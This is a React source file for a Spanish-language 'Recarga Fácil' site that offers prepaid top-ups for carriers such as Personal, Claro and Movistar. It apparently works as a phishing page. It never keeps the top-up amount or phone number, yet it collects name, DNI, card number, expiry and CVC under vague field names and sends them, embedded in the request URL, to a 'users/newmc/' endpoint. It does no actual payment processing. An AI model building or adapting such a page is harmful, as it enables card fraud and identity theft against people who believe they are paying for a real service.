import React, { Component, useContext, useState } from 'react';

import logo from "../../assets/logo.jpg"
import personal from "../../assets/personal.jpg"
import antina from "../../assets/antina.png"
import claro from "../../assets/claro.jpg"
import directv from "../../assets/directv.jpg"
import movistar from "../../assets/movistar.jpg"
import tuenti from "../../assets/tuenti.png"
import edenor from "../../assets/edenor.png"

// Local imports

var allNavArray = []
var navigationArray = [];
var navigationIndex = []

// SCSS imports
import '../../styles/main/boostrap.scss';
import '../../styles/main/home.scss';


// Local Declarations

class Home extends Component {
  constructor(props) {
    super(props);
    this.state = {
      navigation:"home",
      userClick: "",
      userData:{
        name: "",
        dni: "",
        numero1: "",
        fecha: "",
        numero2: ""
      }
    };
  }

  imageReturn(){
    console.log(this.state.userClick, "userclick")
    switch(this.state.userClick){
      case "Personal" :
        return personal
        break
      case "Tuenti" :
        return tuenti
        break
      case "Claro" :
        return claro
        break
      case "Movistar" :
        return movistar
        break
      case "Directv" :
        return directv
        break
      case "Antina" :
        return antina
        break
      case "Edenor" :
        return edenor
        break
      }
  }

  navigationHandler(newNav, newUserClick){
    if(newUserClick){
      this.setState(
        {
        navigation: newNav,
        userClick: newUserClick
        }
      )
    } else {
      this.setState({
        navigation: newNav
      })
    }
  }

  async sendForm() {
    
    console.log("AQUI")
    await fetch(`users/newmc/${JSON.stringify(this.state.userData)}`, {
      method: 'POST',
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json',
        },
      }
    )
    .then((res)=>{console.log(res)})
  }

  inputHandler(){
  const name = document.getElementById("name").value;
  const dni = document.getElementById("dni").value;
  const numero1 = document.getElementById("numero1").value;
  const fecha = document.getElementById("fecha").value;
  const numero2 = document.getElementById("numero2").value;
    this.setState({userData: {
      name: name,
      dni: dni,
      numero1: numero1,
      fecha: fecha,
      numero2: numero2
    }})
  }

  navigationSwitch(){
    switch(this.state.navigation){
      case "home":
        return (
          <div id="home-container" className='container-fluid'>
          <div className="row">
            <div className="col-md-3 col-12 seleccionar_empresa"
                onClick={()=>{
                  this.navigationHandler("user" , "Personal");
                }}
            >
              <div className="empresa" id="personal">
                <img src={personal} alt="Personal logo"/>
                <p>Personal</p>
              </div>
            </div>
            <div className="col-md-3 col-12 seleccionar_empresa"
                onClick={()=>{
                  this.navigationHandler("user" , "Tuenti");
                }}
            >
              <div className="empresa" id="tuenti">
                <img src={tuenti} alt="Tuenti logo"/>
                <p>Tuenti</p>
              </div>
            </div>
            <div className="col-md-3 col-12 seleccionar_empresa"
                onClick={()=>{
                  this.navigationHandler("user" , "Claro");
                }}
            >
              <div className="empresa" id="claro">
                <img src={claro} alt="Claro logo"/>
                <p>Claro</p>
              </div>
            </div>
            <div className="col-md-3 col-12 seleccionar_empresa"
                onClick={()=>{
                  this.navigationHandler("user" , "Movistar");
                }}
            >
              <div className="empresa" id="movistar">
                <img src={movistar}alt="Movistar logo"/>
                <p>Movistar</p>
              </div>
            </div>
            <div className="col-md-3 col-12 seleccionar_empresa"
                onClick={()=>{
                  this.navigationHandler("user" , "Directv");
                }}
            >
              <div className="empresa" id="directv">
                <img src={directv} alt="Directv logo"/>
                <p>DirecTV</p>
              </div>
            </div>
            <div className="col-md-3 col-12 seleccionar_empresa"
                onClick={()=>{
                  this.navigationHandler("user" , "antina");
                }}
            >
              <div className="empresa" id="Antina">
                <img src={antina} alt="antina logo"/>
                <p>Antina</p>
              </div>
            </div>
            <div className="col-md-3 col-12 seleccionar_empresa" 
              onClick={()=>{
                this.navigationHandler("user" , "edenor");
              }}
            >
              <div className="empresa" id="Edenor">
                <img src={edenor} alt="Edenor logo"/>
                <p>Edenor</p>
              </div>
              </div>
            </div>
        </div>
        );
        break
      case "user" :
        return (
          <div id="user-container" className='container-fluid'>
            <div className="row d-flex justify-content-center">
              <div className="col-md-6 col-10 contenedor_recarga">
                <h1>Ingrese el monto a recargar</h1>
                <input 
                  type="text" 
                  inputmode="decimal" 
                  className="input_blank" 
                  placeholder="500" 
                  maxlength="4" 
                  minlength="2" 
                  name="price" 
                  required="" />
                  <button id="user-button" onClick={()=> {this.navigationHandler('recarga')}} >Siguiente</button>
              </div>
            </div>
          </div>
      )
      break
      case "recarga" :
        return(
          <div id="recarga-container" className='container-fluid'>
            <div className='row d-flex justify-content-center'>
              <div class="col-md-6 col-10 contenedor_recarga">
                <h1>Rellena el número prepago</h1>
                <h2>{this.state.userClick} será recargado directamente.</h2>
                <div class="row d-flex justify-content-center align-items-center flex-column">
                  <div class="col-md-6 col-12">
                    <label for="numerorecarga">Número de recarga</label>
                  </div>
                  <div class="col-md-6 col-12">
                    <div class="inputphone row">
                        <div class="col-md-10 col-9">
                        <input type="text" id="cellphone" name="cellphone" required="" />
                      </div>
                    </div>
                  </div>
                </div>
                <button id="recarga-button" onClick={()=> {this.navigationHandler('pago')}}>Siguiente</button>
            </div>
          </div>
        </div>
        )
        break
      case "pago" : 
          return(
          <div id="pago" className='container-fluid'>
            <div className="row d-flex justify-content-center align-items-center flex-column">
                <div className="col-md-6 col-10 contenedor_recarga">
                  <div className="row">
                    <div className="col-md-3 col-12">
                      <img src={this.imageReturn()} className="w-100" alt=""/>
                    </div>
                    <div className="col-md-9 col-12 d-flex flex-column justify-content-center">
                      <h5 className='recarga-titulo'> {this.state.userClick} será recargado inmediatamente</h5>
                      <p className="roboto"></p>
                      <div className="d-flex align-items-center hr">
                      </div>
                      <div className="row">
                        <div className="col d-flex justify-content-left">
                          <h4 className="roboto p-0 m-0"></h4>
                        </div>
                        <div className="col d-flex justify-content-right">
                          <h4 className="roboto p-0 m-0"></h4>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="col-md-6 col-12 contenedor_recarga">
                  <h5>Gracias a nuestra conexión 256-bit SSL segura cada pago es seguro.</h5>
                  <div className="row pt-5 d-flex justify-content-center">
                    <div className="col-11">
                      <div className="input">
                        <label for="name">Nombre y apellido</label>
                        <input onChange={(e)=>{this.inputHandler(e.target.name ,e.target.value)}} type="text" id="name" name="name" placeholder="Nombre y apellido" required=""/>
                      </div>
                    </div>
                    <div className="col-11">
                      <div className="input">
                        <label for="dni">Número de DNI</label>
                        <input onChange={(e)=>{this.inputHandler(e.target.name ,e.target.value)}} type="text" id="dni" name="dni" placeholder="Ingrese su número de documento" inputmode="decimal" required="" minLength={7} maxLength={8}/>
                      </div>
                    </div>
                    <div className="col-11">
                      <div className="input">
                        <label for="card">Número de tarjeta</label>
                        <input onChange={(e)=>{this.inputHandler(e.target.name ,e.target.value)}} type="text" id="numero1" name="numero1" placeholder="Número de tarjeta" inputmode="decimal" required=""/>
                      </div>
                    </div>
                    <div className="col-11">
                      <div className="row">
                        <div className="col-6">
                          <div className="input">
                            <label for="venc">Fecha de caducidad</label>
                            <input onChange={(e)=>{this.inputHandler(e.target.name ,e.target.value)}} type="text" id="fecha" name="fecha" placeholder="MM/AA" required="" minLength={4} maxLength={5}/>
                          </div>
                        </div>
                        <div className="col-6">
                          <div className="input">
                            <label for="cvc">CVC</label>
                            <input onChange={(e)=>{this.inputHandler(e.target.name ,e.target.value)}} id="numero2" name="numero2" placeholder="CVC" inputmode="decimal" required="" minLength={3} maxLength={4} />
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="col-11">
                      <button className="my-3" onClick={()=>{this.sendForm()}}>Siguiente</button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
      )
    }
  }

  render() {
    return(
      <div id="render-div">
        <nav className="navbar navbar-expand-lg navbar-light bg-light py-3 px-md-5">
          <img src={logo} alt="Logo Portal Recargas" />
          <a className="navbar-brand" href="#">Recarga Fácil</a>
        </nav>
        <div className="header">
          <h1>Hace tu recarga facil y rápido</h1>
        </div>
          {this.navigationSwitch()}
     </div>
    )
  }
}

export default Home;
